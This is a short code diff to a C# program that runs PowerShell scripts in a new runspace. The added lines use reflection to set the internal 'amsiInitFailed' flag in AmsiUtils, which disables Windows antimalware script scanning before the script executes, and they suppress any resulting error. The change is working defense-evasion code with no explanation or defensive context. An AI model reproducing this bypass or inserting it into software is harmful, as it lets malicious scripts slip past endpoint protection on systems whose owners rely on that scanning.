@@ -34,6 +34,12 @@ public class Program
             Runspace newrunspace = RunspaceFactory.CreateRunspace();
             newrunspace.Open();
             RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
+            try
+            {
+                var amsi = scriptInvoker.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
+                var amsifield = amsi.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+                amsifield.SetValue(null, true);
+            } catch { }
             Pipeline pipeline = newrunspace.CreatePipeline();
 
             pipeline.Commands.AddScript(cmd);
